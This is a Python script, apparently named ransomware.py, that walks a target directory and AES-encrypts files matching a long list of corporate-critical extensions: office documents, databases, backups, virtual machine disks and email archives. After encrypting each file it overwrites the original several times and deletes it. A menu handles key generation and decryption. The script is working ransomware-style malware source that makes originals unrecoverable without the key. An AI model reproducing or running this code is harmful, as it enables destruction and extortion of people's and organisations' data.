import os
import binascii
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad
import time

# --- CONFIGURATION ---
# File extensions to encrypt/decrypt (lowercase).
# These are commonly considered important files in corporate environments (excluding software development).
FILES_TO_ENCRYPT_EXTENSIONS = (
    '.docx', '.doc',    # Microsoft Word Documents
    '.xlsx', '.xls',    # Microsoft Excel Workbooks
    '.pptx', '.ppt',    # Microsoft PowerPoint Presentations
    '.pdf',             # Adobe PDF Documents
    '.txt',             # Plain Text Files
    '.rtf',             # Rich Text Format
    '.csv',             # Comma Separated Values (Data Sets)
    '.log',             # Log Files (system/application records)
    '.xml', '.json',    # Structured Data F'ormats
    '.html', '.htm',    # Web Pages
    '.pub',             # Microsoft Publisher Documents
    '.vsd', '.vsdx',    # Microsoft Visio Drawings

    '.mdb', '.accdb',   # Microsoft Access Databases
    '.sql',             # SQL Scripts (Database backups/queries)
    '.bak',             # General Backup Files (especially DB backups)
    '.qbw', '.qbb',     # Accounting Software Files (e.g., QuickBooks)

    '.psd',             # Adobe Photoshop Documents
    '.ai',              # Adobe Illustrator Documents
    '.indd',            # Adobe InDesign Documents
    '.jpeg', '.jpg',    # Image Files (JPEG)
    '.png',             # Image Files (PNG)
    '.gif',             # Image Files (GIF)
    '.tiff', '.tif',    # Image Files (TIFF)
    '.bmp',             # Image Files (BMP)
    '.mp3',             # Audio Files
    '.wav',             # Audio Files
    '.mp4',             # Video Files (MPEG-4)
    '.avi',             # Video Files (AVI)
    '.mov',             # Video Files (QuickTime Movie)
    '.wmv',             # Video Files (Windows Media Video)

    '.zip',             # Compressed Files
    '.rar',             # Compressed Files
    '.7z',              # Compressed Files
    '.tar', '.gz', '.tgz', '.bz2', '.xz', # Linux/Unix Compressed Archives
    '.iso',             # Disk Image Files (important system backups or software)
    '.vmdk', '.vhd', '.vhdx', # Virtual Machine Disk Images (Critical server/system backups)
    '.ost', '.pst',     # Microsoft Outlook Data Files (email archives)
)

# Directories to exclude (specify in lowercase)
# System folders, the project's own folder, virtual environments, etc. - USE WITH CAUTION!
EXCLUDE_DIRS = [
    'venv', '__pycache__', '.git', 'node_modules', '$recycle.bin', 'system volume information',
    'program files', 'program files (x86)', 'windows', 'boot', 'recovery',
    'drivers', 'etc', 'dev', 'proc', 'sys', 'run', 'tmp', 'var', 'mnt', 'media',
    'usr', 'lib', 'bin', 'sbin', 'opt', 'srv', 'root', 'lost+found', 'downloads' 
]

# Specific files to exclude (specify in lowercase)
# Do not encrypt your own script or certain hidden/unimportant system-generated files
EXCLUDE_FILES = ['ransomware.py', 'ransomware.py.enc', 'desktop.ini', 'thumbs.db'] 

# --- Irreversible File Deletion Function ---
def secure_delete(file_path, passes=3):
    """
    Securely deletes a file by overwriting it with random data.
    Args:
        file_path (str): The path to the file to be deleted.
        passes (int): Number of overwrite passes. Default 3 passes are generally sufficient.
    """
    if not os.path.exists(file_path):
        return

    try:
        file_size = os.path.getsize(file_path)

        with open(file_path, 'r+b') as f: # 'r+b' read and write, binary mode
            for i in range(passes):
                f.seek(0)
                random_data = get_random_bytes(file_size) # Strong randomness from Cryptodome
                f.write(random_data)
                f.flush()
                os.fsync(f.fileno()) # Ensure data is written to disk
                time.sleep(0.05) # Short delay

            # Overwrite with zeros as a final pass (some deletion standards use zeros for the last pass)
            f.seek(0)
            f.write(b'\x00' * file_size)
            f.flush()
            os.fsync(f.fileno())
        
        # Finally, delete the file normally
        os.remove(file_path)
        # Suppress "deleted" message here, as the main focus is encryption status
        # print(f"'{os.path.basename(file_path)}' successfully deleted.") 

    except Exception as e:
        print(f"Error securely deleting '{os.path.basename(file_path)}': {e}")

# --- Single File Encryption Function ---
def encrypt_single_file(file_path, key):
    """Encrypts the specified file with the given AES key."""
    try:
        iv = get_random_bytes(AES.block_size) # Unique IV for each file
        cipher = AES.new(key, AES.MODE_CBC, iv)

        with open(file_path, 'rb') as f_in:
            file_content = f_in.read()

        padded_content = pad(file_content, AES.block_size)
        encrypted_content = cipher.encrypt(padded_content)

        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, 'wb') as f_out:
            f_out.write(iv + encrypted_content) # Write IV at the beginning of the encrypted data

        print(f"Encrypted: {os.path.basename(file_path)}")
        secure_delete(file_path) # Securely delete the original file
        return True
    except Exception as e:
        print(f"Error encrypting '{os.path.basename(file_path)}': {e}")
        return False

# --- Single File Decryption Function ---
def decrypt_single_file(encrypted_file_path, key):
    """Decrypts the specified encrypted file with the given AES key."""
    try:
        with open(encrypted_file_path, 'rb') as f_in:
            iv = f_in.read(AES.block_size) # First 16 bytes are the IV
            encrypted_content = f_in.read() # The rest is encrypted data

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_content = cipher.decrypt(encrypted_content)
        original_content = unpad(decrypted_content, AES.block_size)

        if encrypted_file_path.lower().endswith('.enc'): 
            original_file_path = encrypted_file_path[:-4] # Remove the '.enc' part
        else: # If '.enc' is not present, we can give a different name
            original_file_path = encrypted_file_path + ".decrypted" 
        
        with open(original_file_path, 'wb') as f_out:
            f_out.write(original_content)

        print(f"Decrypted: {os.path.basename(encrypted_file_path)}")
        # Delete the .enc file after successful decryption
        os.remove(encrypted_file_path) 
        return True
    except Exception as e:
        print(f"Error decrypting '{os.path.basename(encrypted_file_path)}': {e}")
        return False

# --- Directory Traversal and Operation Function ---
def traverse_and_operate(target_directory, key, mode):
    """
    Traverses the specified directory and its subdirectories to encrypt or decrypt files.
    Args:
        target_directory (str): The main directory to operate on.
        key (bytes): The AES key.
        mode (str): 'encrypt' or 'decrypt'.
    """
    if not os.path.isdir(target_directory):
        print(f"Error: '{target_directory}' is not a valid directory.")
        return

    print(f"\nStarting {mode}ion in '{target_directory}' (targeting specific extensions)...")
    
    processed_count = 0
    for root_dir, dirs, files in os.walk(target_directory):
        # Exclude specified directories
        # Modifying 'dirs' in place prevents os.walk from entering these subdirectories.
        dirs[:] = [d for d in dirs if d.lower() not in EXCLUDE_DIRS] 

        for file_name in files:
            file_path = os.path.join(root_dir, file_name)

            # Skip the script itself or already double-encrypted files
            if file_name.lower() in EXCLUDE_FILES or file_name.lower().endswith('.enc.enc'):
                continue

            # Get file extension for targeting
            _, file_extension = os.path.splitext(file_name)
            file_extension = file_extension.lower() # Convert to lowercase for comparison

            if mode == 'encrypt':
                if file_extension in FILES_TO_ENCRYPT_EXTENSIONS:
                    if encrypt_single_file(file_path, key):
                        processed_count += 1
            elif mode == 'decrypt':
                # Only decrypt files with the '.enc' extension
                if file_extension == '.enc':
                    if decrypt_single_file(file_path, key):
                        processed_count += 1
            
    print(f"\nSuccessfully {mode}ed {processed_count} files in '{target_directory}'.")

# --- USER INTERFACE ---
if __name__ == "__main__":
    main_aes_key = None # This key will be used for all file operations

    while True:
        print("\n--- FILE SYSTEM ENCRYPTION/DECRYPTION TOOL ---")
        print("1. Generate New AES Key")
        print("2. Load Existing AES Key (Hex)")
        print("3. Encrypt Directory (Securely Deletes Original Files)")
        print("4. Decrypt Directory (Deletes Encrypted Files)")
        print("5. Exit")
        choice = input("Please enter your choice (1/2/3/4/5): ")

        if choice == '1':
            main_aes_key = get_random_bytes(32) # Generate a new 256-bit key
            print("\n--- YOUR NEW KEY ---")
            print(f"AES Key (Hex): {main_aes_key.hex()}")
            print("--- PLEASE STORE THIS KEY IN A SECURE LOCATION! ---")
        elif choice == '2':
            key_hex = input("Please enter the AES Key you wish to use (in Hex): ")
            try:
                main_aes_key = binascii.unhexlify(key_hex)
                if len(main_aes_key) != 32:
                    raise ValueError("Key length must be 32 bytes.")
                print("Key loaded successfully.")
            except (binascii.Error, ValueError) as e:
                print(f"Error: Invalid key format or length. ({e})")
                main_aes_key = None # Reset key on error
        elif choice == '3':
            if main_aes_key is None:
                print("Please generate or load a key first (Option 1 or 2).")
                continue
            target_dir = input("Enter the path to the directory to encrypt (e.g., C:\\Users\\YourUser\\Documents): ")
            traverse_and_operate(target_dir, main_aes_key, 'encrypt')
        elif choice == '4':
            if main_aes_key is None:
                print("Please generate or load a key first (Option 1 or 2).")
                continue
            target_dir = input("Enter the path to the directory to decrypt (e.g., C:\\Users\\YourUser\\Documents): ")
            traverse_and_operate(target_dir, main_aes_key, 'decrypt')
        elif choice == '5':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")
